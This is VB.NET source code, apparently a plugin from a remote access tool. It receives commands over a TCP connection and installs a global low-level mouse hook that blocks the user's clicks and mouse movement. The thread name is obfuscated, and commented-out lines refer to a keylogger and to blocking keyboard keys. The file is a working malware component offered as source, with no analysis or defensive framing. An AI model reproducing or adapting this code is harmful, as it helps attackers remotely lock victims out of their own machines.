﻿Imports System.Drawing
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Windows.Forms
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class MainCL

    Public Shared ghjk As New Thread(AddressOf gdzbfhbjedzfhujnezdfhjezdfhjezfhjdgsfegrjk)
    Public Shared LEFTCLK As Boolean = False
    Public Shared RIGHTCLK As Boolean = False
    Public Shared MOVE As Boolean = False
    Public Shared ALL As Boolean = False
    Public Shared GLOBALRETURN As Boolean = False
    Public Shared Sub ST(ByVal k As TcpClient, ByVal l As String)
        '   MessageBox.Show("Waqdqsdt")
        ' StartKeylogger()
        Dim h As String() = Split(l, "|SP2|")
        If h(1) = "|MSLKALL|" Then

            GLOBALRETURN = True
            ALL = True
            MOVE = True
            LEFTCLK = True
            RIGHTCLK = True

            ghjk.Start()

        ElseIf h(1) = "|MSLKLEFT|" Then

            GLOBALRETURN = True
            ALL = False
            MOVE = False
            LEFTCLK = True
            RIGHTCLK = False

            ghjk.Start()

        ElseIf h(1) = "|MSLKLRIGHT|" Then
            GLOBALRETURN = True
            ALL = False
            MOVE = False
            LEFTCLK = False
            RIGHTCLK = True
            ' MessageBox.Show("STOPKBLG")

            ghjk.Start()

        ElseIf h(1) = "|MSLKLMV|" Then
            GLOBALRETURN = True
            ALL = False
            MOVE = True
            LEFTCLK = False
            RIGHTCLK = False
            ' MessageBox.Show("STOPKBLG")

            ghjk.Start()

        ElseIf h(1) = "|MSUNLK|" Then

            GLOBALRETURN = False
            ALL = False
            MOVE = False
            LEFTCLK = False
            RIGHTCLK = False
            ' MessageBox.Show("STOPKBLG")

            ghjk.Start()

        End If



    End Sub
    Public Shared Sub gdzbfhbjedzfhujnezdfhjezdfhjezfhjdgsfegrjk()


        Dim objCurrentModule As ProcessModule = Process.GetCurrentProcess().MainModule

        Dim objKeyboardProcess As New LowLevelMouseProc(AddressOf captureKey)
        Dim curProcess As Process = Process.GetCurrentProcess()
        ptrHook = SetWindowsHookEx(14, objKeyboardProcess, GetModuleHandle(curProcess.ProcessName), 0)

        System.Windows.Forms.Application.Run()
    End Sub

    ''
    ' SOLUTION ADAPTED FROM : http://geekswithblogs.net/aghausman/archive/2009/04/26/disable-special-keys-in-win-app-c.aspx written in c#
    '' Rewritten By Arsium in VBNET
    ''
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function SetWindowsHookEx(ByVal id As Integer, ByVal callback As LowLevelMouseProc, ByVal hMod As IntPtr, ByVal dwThreadId As UInteger) As IntPtr

    End Function
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function GetModuleHandle(ByVal name As String) As IntPtr

    End Function

    <StructLayout(LayoutKind.Sequential)>
    Private Structure MSLLHOOKSTRUCT
        Public pt As Point
        Public mouseData As Integer
        Public flags As Integer
        Public time As Integer
        Public extra As IntPtr
    End Structure

    Public Delegate Function LowLevelMouseProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Public Shared Function UnhookWindowsHookEx(ByVal hook As IntPtr) As Boolean

    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function CallNextHookEx(ByVal hook As IntPtr, ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr) As IntPtr

    End Function

    Public Shared ptrHook As IntPtr

    Public Shared Function captureKey(ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr)



        If nCode >= 0 Then


            Dim objKeyInfo As MSLLHOOKSTRUCT = CType(Marshal.PtrToStructure(lp, GetType(MSLLHOOKSTRUCT)), MSLLHOOKSTRUCT)

            If GLOBALRETURN = True Then

                If ALL = True Then




                    '
                    '    If objKeyInfo.key = Keys.LWin Then
                    '     Return CType(1, IntPtr)
                    '  End If

                    '  If objKeyInfo.key = Keys.LControlKey Then
                    '   Return CType(1, IntPtr)
                    ' End If



                    If wp = &H201 Then 'WM_LBUTTONDOWN 
                        ' MessageBox.Show("Left")
                        Return wp


                    End If

                    If wp = &H202 Then  'WM_LBUTTONUP            
                        Return wp
                    End If

                    If wp = &H203 Then ''LEFT DB CLICK
                        Return wp
                    End If

                    '0x0203








                    If wp = &H204 Then  ''WM_RBUTTONDOWN

                        Return wp


                    End If


                    If wp = &H205 Then  ''WM_RBUTTONUP

                        Return wp


                    End If


                    If wp = &H206 Then '' WM_RBUTTONDBLCLK

                        Return wp


                    End If







                    ' If MOVE = True Then

                    If wp = &H200 Then  '' MOUSE MOVE

                        Return wp


                    End If
                    '  0x0200


                    ' End If



                Else






                    If LEFTCLK = True Then

                        If wp = &H201 Then 'WM_LBUTTONDOWN 
                            ' MessageBox.Show("Left")
                            Return wp


                        End If

                        If wp = &H202 Then  'WM_LBUTTONUP            
                            Return wp
                        End If

                        If wp = &H203 Then ''LEFT DB CLICK
                            Return wp
                        End If

                        '0x0203

                    End If



                    If RIGHTCLK = True Then


                        If wp = &H204 Then  ''WM_RBUTTONDOWN

                            Return wp


                        End If


                        If wp = &H205 Then  ''WM_RBUTTONUP

                            Return wp


                        End If


                        If wp = &H206 Then '' WM_RBUTTONDBLCLK

                            Return wp


                        End If




                    End If



                    If MOVE = True Then

                        If wp = &H200 Then  '' MOUSE MOVE

                            Return wp


                        End If
                        '  0x0200


                    End If

                End If



            Else

                Exit Function
                Return CallNextHookEx(ptrHook, nCode, wp, lp)
            End If


            Return CallNextHookEx(ptrHook, nCode, wp, lp)
        End If


        '    Return CallNextHookEx(ptrHook, nCode, wp, lp)


    End Function

End Class
